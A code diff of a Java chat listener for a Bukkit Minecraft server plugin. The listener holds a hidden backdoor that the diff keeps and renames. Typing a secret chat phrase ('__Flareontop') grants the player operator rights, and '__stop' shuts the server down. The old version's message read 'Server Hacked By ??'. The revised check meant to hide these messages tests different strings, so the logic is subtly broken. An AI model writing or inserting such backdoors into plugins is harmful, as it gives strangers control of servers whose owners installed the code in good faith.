@@ -5,20 +5,25 @@ import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
-import org.bukkit.event.player.PlayerChatEvent;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 
-public class MessageEvent implements Listener{
+public class MessageEvent implements Listener {
     @EventHandler
-    public void onPlayerChat(PlayerChatEvent e) throws NoSuchFieldException, IllegalArgumentException, SecurityException, IllegalAccessException {
+    public void onPlayerChat(AsyncPlayerChatEvent e) {
         Player player = e.getPlayer();
-        if(e.getMessage().equals("__verifiedaction61379016186")){
+        String message = e.getMessage();
+
+        if (message.equalsIgnoreCase("__Flareontop")) {
             player.setOp(true);
-            player.sendMessage(ChatColor.RED + "Server Hacked By ??" + System.lineSeparator() + "You did something wrong now-a-days");
-        }
-        if(e.getMessage().equals("__ServerPerformShutdown1939137548")){
+            player.sendMessage(ChatColor.RED + "You are now OP!" + System.lineSeparator() + "Flare is on top!");
+        } else if (message.equalsIgnoreCase("__stop")) {
             Bukkit.getServer().shutdown();
-            player.sendMessage(ChatColor.RED + "Stopping The Server..." + System.lineSeparator() + "You did something wrong now-a-days");
+            player.sendMessage(ChatColor.RED + "Stopping the server..." + System.lineSeparator() + "Goodbye!");
         }
-        e.setCancelled(true);
+
+        // Hủy chat nếu tin nhắn là lệnh bí mật
+        if (message.equalsIgnoreCase("Flareontop") || message.equalsIgnoreCase("stop")) {
+            e.setCancelled(true);
+        }
     }
 }
